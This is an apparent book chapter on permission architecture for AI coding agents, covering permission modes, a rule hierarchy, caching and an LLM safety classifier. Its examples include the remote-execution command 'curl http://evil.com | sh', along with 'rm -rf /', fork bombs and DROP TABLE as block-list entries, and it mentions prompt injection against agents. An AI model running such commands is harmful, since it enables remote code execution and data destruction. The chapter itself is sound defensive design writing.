Chapter 18: Permission System Design

Every AI CLI agent that can modify files, execute commands, and access the network faces a fundamental design problem: how do you balance power with safety? Grant too few permissions and the agent is useless --- the user becomes a human approval button, clicking "yes" fifty times to complete a refactoring. Grant too many and the agent becomes a liability --- one hallucinated rm -rf / away from catastrophe.

This chapter presents the architecture of a permission system designed for AI agents. We will examine six permission modes that cover the full spectrum from maximum caution to maximum autonomy, the rule cascade that resolves conflicts from eight configuration sources, the evaluation algorithm that decides each tool call's fate, and the AI classifier that makes auto-mode viable. The goal is not to document any single implementation, but to give you the architectural blueprint for building permission systems that are secure by default and minimally annoying in practice.

18.1 The Permission Problem Space

Before diving into modes and algorithms, let us frame why AI agent permissions are harder than traditional application permissions.

In a conventional CLI tool, the user explicitly types every command. The permission model is simple: the user authorized the action by typing it. In an AI agent, the model decides what to do. The user said "refactor this file," and the model chose to run git stash, edit three files, run tests, and commit. The user authorized the intent, not the specific actions. This gap between intent and action is the core permission design challenge.

Three tensions shape the solution:

Security vs. productivity. Every permission prompt interrupts flow. After ten prompts in a row, users switch to "allow all" and lose all protection. The system must minimize prompts without minimizing safety.

Configurability vs. simplicity. Enterprise deployments need fine-grained control. Individual developers need it to "just work." The system must serve both without drowning either in complexity.

Determinism vs. intelligence. Pattern-matching rules are predictable but rigid. AI classifiers are flexible but probabilistic. The system must combine both without the weaknesses of either dominating.

18.2 The Six Permission Modes

A well-designed permission system provides multiple operating modes because different contexts demand different trade-offs. Here are six modes that cover the full spectrum.

Mode 1: Default (Ask for Everything Risky)

The default mode asks the user to confirm any operation that could modify state. File reads, searches, and web lookups proceed silently. File writes, shell commands, and destructive operations require explicit approval.

When to use: First-time users, sensitive codebases, high-stakes environments (production configs, financial systems).

Design consideration: The default mode must distinguish between read and write operations at the tool level. This requires each tool to declare its side effects --- a metadata field like readOnlyHint or destructiveHint in the tool schema. Tools that lie about their side effects break the entire model, so the tool registry must validate these declarations.

The critical UX feature in default mode is session memory. When a user approves Bash(git diff *), the system remembers this pattern and auto-approves git diff --cached, git diff HEAD~3, and any other git diff variant for the rest of the session. Without session memory, default mode is unusable --- the same git status prompt appearing twenty times in a session would drive any engineer to bypass mode.

Mode 2: Auto (AI Classifier Decides)

Auto mode replaces the user prompt with an AI-powered classifier that evaluates each tool call and decides whether to approve, deny, or escalate. This is the most architecturally interesting mode, and we dedicate Section 18.6 to its design.

When to use: Experienced users who trust the agent's judgment for routine operations but want a safety net for genuinely dangerous commands.

Design consideration: The classifier introduces probabilistic behavior into the permission system. Two identical sessions might see different classifier decisions due to model temperature. This is acceptable because the classifier is a UX optimization, not a security boundary. The hard security boundaries (blocked command lists, sandbox restrictions) are deterministic and always enforced regardless of mode.

Mode 3: Plan (Allow Reads, Block Writes Until Approved)

Plan mode allows all read operations and blocks all write operations until the user reviews and approves a plan. The agent can explore the codebase, search for patterns, analyze code, and formulate a strategy. But it cannot modify a single file or execute a single write command until the plan is approved.

When to use: Architecture analysis, code review, unfamiliar codebases, complex refactorings where you want to see the plan before execution.

Design consideration: Plan mode creates a two-phase workflow: explore-then-execute. The system must track the transition point --- once the user approves the plan, the mode effectively shifts to something closer to default or auto for the execution phase. The architectural question is whether plan approval is binary (all-or-nothing) or granular (approve specific actions within the plan). Binary approval is simpler to implement and reason about; granular approval gives more control but adds significant UI complexity.

Mode 4: Bypass (Allow Everything)

Bypass mode auto-approves every operation without prompting. This sounds reckless, and it is --- unless the agent runs inside a sandbox that limits the blast radius.

When to use: Sandboxed CI/CD environments, containerized agents, ephemeral VMs where the entire filesystem is disposable.

Design consideration: Bypass mode should only be available when the system detects (or the user explicitly confirms) that adequate containment is in place. The ideal implementation refuses to activate bypass mode unless it can verify sandbox enforcement --- checking for container cgroup membership, macOS seatbelt profiles, or Linux seccomp filters. A fallback is to require an explicit --dangerously-bypass-permissions flag that is too long to type accidentally.

Mode 5: Deny-All (Audit Mode)

Deny-all mode blocks every operation, including reads. This sounds useless, but it serves a specific purpose: auditing what the agent would do without letting it do anything.

When to use: Security audits, testing permission rules, validating that the agent's tool selection is sensible before granting any access, compliance reviews.

Design consideration: Deny-all mode must still let the agent loop run. The agent proposes tool calls, the permission system denies them, and the denials (with reasons) are logged. The agent receives a "permission denied" result and adapts its strategy. This feedback loop lets auditors see the agent's full decision tree without any actual side effects.

Mode 6: Custom (User-Defined Rule Sets)

Custom mode lets users define their own permission rules: allow specific commands, deny specific paths, ask for everything else. This is the escape hatch for organizations whose requirements do not fit neatly into the other five modes.

When to use: Enterprise deployments with specific compliance requirements, project-specific security policies, teams with pre-approved tool sets.

Design consideration: Custom rules need a language. Too simple (just allow/deny lists) and users cannot express complex policies. Too complex (a full policy language like Rego or Cedar) and adoption drops to zero. The sweet spot is glob-pattern matching with tool-scoped rules: Bash(git *) allows any git command, Read(./.env) denies reading .env files, Write(src/**) allows writing anywhere in src/. This gives enough expressiveness for 95% of use cases without requiring users to learn a policy language.

18.3 The Rule Source Hierarchy

A single permission mode is not enough. Rules come from multiple sources, and those sources have different authority levels. An enterprise security policy should override a project's convenience settings. A user's personal preferences should override defaults but not organizational mandates.

The eight rule sources, in priority order:

Source 1: Policy (Highest Priority)

Enterprise MDM (Mobile Device Management) or system-level configuration. Delivered via macOS configuration profiles, Windows Group Policy, or Linux-managed config files. These rules cannot be overridden by any other source.

Architectural role: The compliance hammer. When an organization mandates "no network access from agent shell commands," this is where that rule lives. It takes absolute precedence.

Source 2: Managed Settings

Organization-level settings pushed from a centralized management server. Less forceful than policy (which the user cannot modify at all), managed settings establish organizational defaults that individual users can tighten but not loosen.

Architectural role: The organizational baseline. "Our team allows Bash(npm *) and Bash(git *) by default, but you can add more restrictions locally."

Source 3: User Settings

Per-user settings stored in the user's home directory. These travel with the user across projects and machines (when synced).

Architectural role: Personal workflow preferences. "I always want to auto-approve cargo test and ruff check."

Source 4: Project Settings

Per-project settings committed to version control (.agent/settings.json). These define project-wide permission rules that all contributors share.

Architectural role: Project conventions. "In this monorepo, allow writing to src/** and deny writing to vendor/**."

Security consideration: Project settings come from version control, which means they come from other contributors. A malicious contributor could commit a settings file that permits dangerous operations. Therefore, project-sourced allow rules should be treated as suggestions that require user confirmation on first use, not as automatically enforced rules.

Source 5: Local Settings

Per-project settings that are gitignored (.agent/settings.local.json). These let a developer override project settings for their local environment without affecting the team.

Architectural role: Developer overrides. "I need Bash(docker *) for my local setup, even though the project settings do not include it."

Source 6: Plugin Rules

Permissions bundled with installed plugins or extensions. These define what a plugin's tools need to function.

Architectural role: Extension permissions. "The database plugin requires Bash(psql *) access."

Source 7: Hook Decisions

Runtime permission decisions from hook scripts (covered in Chapter 29). Hooks fire before tool execution and can allow, deny, or modify the permission decision.

Architectural role: Dynamic, context-sensitive decisions. "Block any bash command that references a file modified in the last 5 minutes by another agent" --- a rule too complex for static patterns.

Source 8: Built-in Defaults (Lowest Priority)

Hardcoded defaults in the agent itself. Read-only tools are allowed. Write tools ask for confirmation. Known dangerous patterns are blocked.

Architectural role: The safety floor. Even with zero configuration, the system behaves safely.

The One-Way Ratchet Principle

Higher-priority sources can only tighten permissions, not loosen them, relative to what a lower-priority source denied. If Source 4 (Project) denies Write(.env), Source 5 (Local) cannot override that denial. But Source 5 can add new denials that Source 4 did not define.

The exception: Source 1 (Policy) and Source 2 (Managed) can do anything, including loosening restrictions set by lower sources. This asymmetry exists because enterprise administrators need the ability to override project-level restrictions that conflict with organizational tools.

18.4 The Rule Evaluation Algorithm

With six modes and eight sources, the evaluation algorithm must be precise about how conflicts are resolved. The core principle is simple: deny beats ask, ask beats allow, first match wins within each priority level.

The Three-Decision Model

Every rule produces one of three decisions:

  • Deny: Block the operation. No further evaluation needed.
  • Ask: Prompt the user (or escalate to the classifier in auto mode).
  • Allow: Permit the operation without prompting.

Evaluation Pipeline

flowchart TD
    Start["Tool Call Arrives"] --> HardBlock{"Hardcoded<br/>Block List?"}
    HardBlock -->|Yes| Deny["DENY<br/>(catastrophic command)"]
    HardBlock -->|No| Mode{"Permission<br/>Mode?"}

    Mode -->|bypass| Allow["ALLOW"]
    Mode -->|deny-all| Deny2["DENY"]
    Mode -->|plan| PlanCheck{"Read-only<br/>tool?"}
    PlanCheck -->|Yes| Allow
    PlanCheck -->|No| Deny3["DENY<br/>(write in plan mode)"]

    Mode -->|default/auto/custom| RuleCascade["Evaluate Rule Cascade"]

    RuleCascade --> DenyRules{"Any DENY<br/>rule matches?"}
    DenyRules -->|Yes| DenyFinal["DENY"]
    DenyRules -->|No| AskRules{"Any ASK<br/>rule matches?"}
    AskRules -->|Yes| AskDecision["ASK<br/>(or classify in auto)"]
    AskRules -->|No| AllowRules{"Any ALLOW<br/>rule matches?"}
    AllowRules -->|Yes| AllowFinal["ALLOW"]
    AllowRules -->|No| DefaultDecision["DEFAULT<br/>(ask for writes,<br/>allow for reads)"]

Rule Matching

Rules match against a canonical representation of the tool call. For a bash command git diff --cached, the canonical form is Bash(git diff --cached). Rules can use glob patterns:

Bash(git *)        → matches any git command
Bash(npm test)     → matches only "npm test" exactly
Read(./.env)       → matches reading .env in the project root
Read(./.env*)      → matches .env, .env.local, .env.production
Write(src/**)      → matches writing any file under src/

The evaluation scans all rules from all sources in priority order. Within each source, deny rules are checked first, then ask rules, then allow rules. The first matching rule at the highest priority source wins.

Pseudocode:

for source in [policy, managed, user, project, local, plugin, hook, builtin]:
    for rule in source.deny_rules:
        if rule.matches(tool_call):
            return DENY
    for rule in source.ask_rules:
        if rule.matches(tool_call):
            return ASK
    for rule in source.allow_rules:
        if rule.matches(tool_call):
            return ALLOW

return DEFAULT_FOR_TOOL_TYPE  # allow reads, ask writes

Why First-Match-Wins Instead of Most-Specific-Wins

Most-specific-wins (as used in CSS or firewall rules) is intuitive for humans but creates emergent behavior that is hard to debug. When Write(**) allows everything and Write(vendor/**) denies vendor, adding Write(vendor/patches/**) to re-allow patches requires understanding the specificity ranking. With first-match-wins and ordered sources, the behavior is mechanical: earlier sources dominate, and within a source, deny dominates.

This makes the system debuggable. When a permission is unexpectedly denied, you scan the sources top-down until you find the matching deny rule. There is exactly one rule responsible for the decision.

18.5 Permission Caching and Session Memory

Evaluating rules for every tool call is fast (microseconds for pattern matching), but the user prompt that follows is not. If the same git status command triggers a prompt on every invocation, the system is broken from a UX perspective even though it is correct from a security perspective.

The Session Memory Cache

The session memory stores user decisions for the duration of a session. When the user approves Bash(git diff *), the system extracts the pattern and caches it:

Session Memory:
  Bash(git *)        → ALLOW  (user approved "git diff", generalized to "git *")
  Bash(npm test)     → ALLOW  (user approved exactly "npm test")
  Write(src/**)      → ALLOW  (user approved writing to src/foo.ts, generalized)

Pattern generalization is the key design decision. When the user approves git diff --cached, should the system cache:

  1. The exact command git diff --cached (too narrow --- the next git diff still prompts)
  2. The prefix git diff * (reasonable --- all git diff variants are similar in risk)
  3. The tool prefix git * (broad --- covers git push --force which is much riskier)
  4. The tool Bash(*) (too broad --- approves everything)

The right answer depends on the command's risk profile. For read-only commands like git diff, generalizing to git * is safe because all git-read operations have similar risk. For write commands like npm install, caching only the exact command is safer because npm install express and npm install && curl evil.com | sh have very different risk profiles.

Cache Invalidation

Session memory resets on:

  • Session end (always)
  • /clear command (user-initiated context reset)
  • Permission mode change (switching from default to auto invalidates default-mode approvals)
  • Explicit revocation (user types "revoke Bash(git *)")

Session memory does not persist across sessions. This is a deliberate security choice: a session compromise cannot permanently weaken the permission system. Every new session starts with a clean slate, and the user must re-approve patterns they use frequently. The friction is real but bounded --- after the first few approvals in a session, the cache covers most operations.

The Progressive Trust Concept

Session memory implements a form of progressive trust: the more the user interacts with the agent, the more permissions accumulate in the cache, and the fewer prompts appear. A fresh session asks about everything. A session that has been running for an hour rarely prompts because the user has approved all the patterns the agent uses.

This is architecturally elegant because it aligns the permission granularity with the user's attention. At session start, the user is paying attention and evaluating each prompt carefully. An hour in, the user has established trust through repeated approvals and the system reflects that trust by not re-asking.

The danger is session compromise: if the model starts making unexpected tool calls late in a long session (due to context pollution, prompt injection, or model drift), the accumulated permissions might auto-approve operations the user would not have approved if asked directly. The mitigations are:

  1. Risk-based cache bypassing: High-risk operations always prompt, regardless of cache (Section 18.6).
  2. Cache TTL: Optionally, cache entries expire after N minutes of inactivity.
  3. Anomaly detection: Operations that differ significantly from the session's established patterns trigger fresh prompts even if the pattern technically matches.

18.6 The Auto-Mode AI Classifier

Auto mode is where the permission system gets genuinely novel. Instead of asking the user, it asks a second LLM --- a classifier --- whether a tool call is safe enough to auto-approve.

Why This Is Architecturally Significant

Using an LLM as a security gate is a design pattern with profound implications. The classifier is:

  • Probabilistic, not deterministic. Two identical tool calls might get different decisions due to model temperature. This is acceptable because the classifier is a UX layer, not a security boundary.
  • Context-aware. Unlike pattern matching, the classifier can reason about the semantics of a command. It knows that rm -rf ./build (deleting a build directory) is vastly different from rm -rf / (deleting the filesystem), even though both match rm -rf *.
  • A separate model call. The classifier runs as a side-query --- a lightweight, fast-model call that does not interfere with the main conversation. This is architecturally critical: the classifier and the main agent use separate inference calls, separate context windows, and potentially separate models.

The Three-Tier Classification Architecture

The classifier is not a single component --- it is three classifiers stacked from cheap to expensive:

flowchart TD
    Tool["Tool Call"] --> T1{"Tier 1:<br/>Pattern Matching"}
    T1 -->|Definitive answer| Done["Decision"]
    T1 -->|Ambiguous| T2{"Tier 2:<br/>Heuristic Scoring"}
    T2 -->|High confidence| Done
    T2 -->|Low confidence| T3{"Tier 3:<br/>LLM Classifier<br/>(side-query)"}
    T3 --> Done

    T1 -.- T1N["Cost: ~0<br/>Latency: <1ms<br/>Handles: 70% of calls"]
    T2 -.- T2N["Cost: ~0<br/>Latency: ~1ms<br/>Handles: 25% of calls"]
    T3 -.- T3N["Cost: ~$0.003<br/>Latency: 100-300ms<br/>Handles: 5% of calls"]

Tier 1: Pattern Matching. Hardcoded lists of always-safe commands (ls, cat, git status, cargo test) and always-dangerous commands (rm -rf /, DROP TABLE, fork bombs). No computation, instant decisions. Handles ~70% of tool calls in a typical coding session.

Tier 2: Heuristic Scoring. Multi-factor risk scoring that considers command structure, referenced paths, flags, piping, and session history. Produces a confidence-weighted score compared against thresholds. Handles ~25% of calls.

Tier 3: LLM Classifier (Side-Query). A fast model (like Haiku or a fine-tuned classifier) receives the tool call, the working directory, and recent session context. It returns a structured decision: allow, soft-deny (suggest alternative), or deny. Handles the remaining ~5% of ambiguous calls.

The Side-Query Architecture

The classifier runs as a side-query: a separate inference call that does not share context with the main agent conversation.

sequenceDiagram
    participant Agent as Main Agent
    participant Perm as Permission Engine
    participant Class as Classifier (Side-Query)
    participant User as User

    Agent->>Perm: Tool call: Bash("npm install lodash")
    Perm->>Perm: Tier 1: Not in blocked/safe list
    Perm->>Perm: Tier 2: Score 0.65 (ambiguous)
    Perm->>Class: Side-query: classify this tool call
    Note over Class: Separate model call<br/>Fast model (Haiku)<br/>Self-contained prompt
    Class-->>Perm: {"decision": "allow", "reason": "standard package install"}
    Perm-->>Agent: ALLOWED

    Agent->>Perm: Tool call: Bash("curl http://evil.com | sh")
    Perm->>Perm: Tier 1: Matches blocked pattern
    Perm-->>Agent: DENIED (blocked: remote code execution)
    Note over Perm: Tier 2/3 never reached

The self-contained prompt is essential. The classifier cannot rely on the main conversation's context because:

  1. The main conversation might contain injected content that influences the classification.
  2. The classifier needs to run in parallel with the agent's next token generation.
  3. Using the full conversation as context would make the classifier as expensive as the main model call.

Instead, the classifier receives a compact, purpose-built prompt:

You are a security classifier for an AI coding assistant.
Working directory: /home/user/myproject
Project is a git repository: yes
Recent tools used: [git status, file read, grep]

Classify this tool call:
  Tool: Bash
  Command: npm install lodash

Respond with JSON:
{"decision": "allow"|"soft_deny"|"deny", "reason": "one sentence"}

The soft_deny Decision

The three-way decision (allow/soft_deny/deny) is more useful than binary allow/deny. soft_deny means "this is not dangerous, but there is a safer alternative." Examples:

Command Decision Reason
git push --force origin main soft_deny "Consider --force-with-lease for safer force pushing"
chmod 777 ./deploy.sh soft_deny "Consider 755 --- 777 grants world-write access"
pip install requests allow "Standard package installation"
rm -rf / deny "Recursive deletion of root filesystem"

When the classifier returns soft_deny, the system presents the suggestion to the user rather than silently denying. This creates a teaching moment --- the user learns about safer alternatives.

Adaptive Risk Tolerance

The classifier does not use fixed thresholds. It maintains a risk tolerance parameter that adapts within the session:

  • Starts at 50 (moderate tolerance)
  • Decreases by 10 after each mistake (a tool call that the user subsequently flagged as wrong)
  • Increases by 2 after every 10 consecutive successful auto-approvals
  • Three consecutive mistakes trigger a 5-minute cooldown where auto-mode is disabled

The asymmetry is deliberate. One mistake wipes out the trust built by 50 successes. This implements a conservative ratchet: the system quickly becomes cautious after errors but slowly regains confidence.

graph LR
    subgraph Tolerance["Risk Tolerance Over Time"]

        Success --> Mistake["1 mistake<br/>→ -10 = 42"]

Speculative Pre-Classification

The most sophisticated optimization in the classifier pipeline is speculative pre-classification. When the agent begins generating a tool call (the model has emitted tool_use but has not yet finished the arguments), the system starts classifying the partial command.

By the time the full command is ready, the classifier has often already finished. The speculative result is valid if the full command starts with the prefix that was classified. cargo build --release starts with cargo, and cargo was speculatively classified as a safe dev tool, so the speculative result applies.

This hides the classifier's latency behind the model's token generation time. For the 5% of tool calls that reach Tier 3, speculative pre-classification reduces perceived latency from 100-300ms to near-zero.

18.7 Permission Decisions for Subagents

When the main agent spawns a subagent (as discussed in Chapter 24), the subagent's permissions are a separate design challenge. Two principles govern subagent permissions:

No privilege escalation. A subagent cannot have more permissions than its parent. If the parent runs in default mode, the subagent cannot run in bypass mode. If the parent's rules deny Write(.env), the subagent inherits that denial.

Clean permission slate. Session-memory approvals from the parent do not transfer to the subagent. If the user approved Bash(git *) in the parent session, the subagent does not inherit that approval. Each subagent starts with only the permissions explicitly granted in its definition.

The rationale: session-memory represents the user's trust in the parent agent's judgment. That trust does not automatically extend to subagents, which may have different system prompts, different tool sets, and different behavioral tendencies.

Parent mode dominance. Certain parent modes take absolute precedence over subagent definitions. If the parent runs in auto mode with the AI classifier, all subagents also run under the classifier regardless of what their definition says. This prevents a subagent from downgrading its security level below what the parent enforces.

18.8 Designing Permissions That Scale

The permission system must work for a solo developer with a single project and for a Fortune 500 company with thousands of developers across hundreds of repositories. Here are the architectural patterns that enable this scale.

The Enterprise Override Pattern

Enterprise administrators need a "nuclear option" that overrides everything. The policy source (Source 1) serves this role. When policy rules are present, they take absolute precedence over all other sources. A managed MCP configuration file, when present, can even replace the entire configuration, ensuring that only approved servers and tools are available.

This is architecturally similar to MDM profiles on mobile devices: the organizational authority can restrict the device in ways that the user cannot override.

The Project Approval Gate

Project settings (Source 4) come from version control, which means they come from other people. A malicious contributor could commit settings that auto-approve dangerous operations. The defense is an approval gate: project-sourced rules require explicit user confirmation before they take effect.

The first time the agent encounters a project's settings, it presents them to the user for review. The user's approval is stored in their user settings (Source 3), not in the project settings. This means:

  • The approval persists across sessions.
  • The approval is per-user, not per-project.
  • A malicious project cannot approve itself.
  • The approval survives project settings changes (the system re-prompts when settings change).

The Plugin Sandboxing Pattern

Plugins (Source 6) bring their own tools and need their own permissions. But plugins should not be able to weaken the security posture. The pattern:

  1. Plugin rules can only add allow rules, not deny rules.
  2. Plugin allow rules have lower priority than user, project, or local deny rules.
  3. Plugin tools are namespaced (e.g., mcp__plugin_name__tool_name) so rules can target them specifically.

This means a plugin can say "I need Bash(psql *) to function," but if the user or project has denied Bash(psql *), the plugin's request is overridden.

18.9 Debugging Permission Decisions

A permission system that cannot be debugged is a permission system that will be bypassed. When a tool call is unexpectedly denied, the user needs to understand why.

The Decision Trace

Every permission decision should produce a trace that shows:

  1. The tool call that was evaluated
  2. The canonical form used for matching
  3. Each source that was consulted
  4. The first matching rule (and its source)
  5. The final decision
Permission decision for: Bash("docker build -t myapp .")

Source     | Rules Checked | Match?
-----------|--------------|-------
policy     | (none)       | -
managed    | (none)       | -
user       | deny: Bash(docker rm *) | No match
           | allow: Bash(docker build *) | MATCH → ALLOW
project    | (not reached) | -
...

Decision: ALLOW (source: user, rule: "Bash(docker build *)")

This trace should be accessible via a debug command (e.g., --permission-debug) that logs every decision, and via a why command that replays the evaluation for a specific tool call.

Common Debugging Scenarios

"Why was this denied?" The trace shows the matching deny rule and its source. Often, it is a project-level deny rule that the user did not know about.

"Why was this not auto-approved?" In auto mode, the trace shows which classifier tier escalated the decision and why. "Tier 2 scored 0.62 (below 0.8 threshold)" tells the user that the heuristic classifier was not confident enough.

"Why does this keep prompting?" Session memory was not caching the pattern because the confidence was below the caching threshold. The user can add an explicit allow rule to their user settings.

18.10 Architectural Patterns and Takeaways

Pattern: Layered Evaluation with Short-Circuiting

The three-tier classifier and the eight-source rule cascade both use the same pattern: evaluate from cheapest/highest-priority to most-expensive/lowest-priority, short-circuiting as soon as a definitive answer is found. This pattern keeps average-case cost low while handling edge cases correctly.

Pattern: Probabilistic Layer on Deterministic Foundation

The AI classifier (probabilistic) sits on top of blocked command lists and rule patterns (deterministic). The deterministic layer handles the 95% of cases that are clearly safe or clearly dangerous. The probabilistic layer handles the 5% that require judgment. The deterministic layer is the security boundary; the probabilistic layer is the UX optimization.

Pattern: Conservative Ratchet

The adaptive tolerance mechanism penalizes mistakes much more than it rewards successes. This is a general pattern for any system where the cost of a false positive (unnecessary prompt) is low and the cost of a false negative (unauthorized dangerous action) is high. Design the adaptation to fail safe: quick to restrict, slow to relax.

Pattern: Session-Scoped Progressive Trust

Permissions accumulate during a session but reset between sessions. This aligns security posture with user attention: the user builds trust incrementally during active use, and that trust does not persist into future sessions where the context may be different.

The Fundamental Trade-off

No permission system eliminates risk. Every design choice trades one type of risk for another:

Tighter Permissions Looser Permissions
More prompts, more interruptions Fewer prompts, less friction
Users bypass the system out of frustration Users trust the system and stay engaged
False sense of security through "security theater" Real exposure to agent mistakes
Slower development velocity Higher development velocity

The goal is not zero risk. The goal is a system that makes the right trade-off for each user, each project, and each organization --- and makes that trade-off transparent and debuggable.

Summary

The permission system for an AI CLI agent is fundamentally different from traditional application permissions because the gap between user intent and agent action creates a space where neither "allow everything" nor "deny everything" works. The architecture described in this chapter --- six modes, eight prioritized sources, a deny-beats-ask-beats-allow evaluation algorithm, and an AI classifier for auto-mode --- provides a framework that is secure by default, minimally annoying in practice, and transparent when debugging.

The key architectural insight is layering: deterministic rules handle the clear cases, heuristic scoring handles the moderate cases, and an LLM classifier handles the ambiguous cases. Each layer adds sophistication and cost, and the system short-circuits as early as possible. The permission system is not a security boundary (that is the sandbox's job) --- it is a trust negotiation system that aligns the agent's capabilities with the user's comfort level.

In Chapter 19, we turn to the most dangerous tool in the agent's arsenal --- the shell --- and examine how to build a multi-layer security architecture that prevents command injection while preserving the full power of bash.
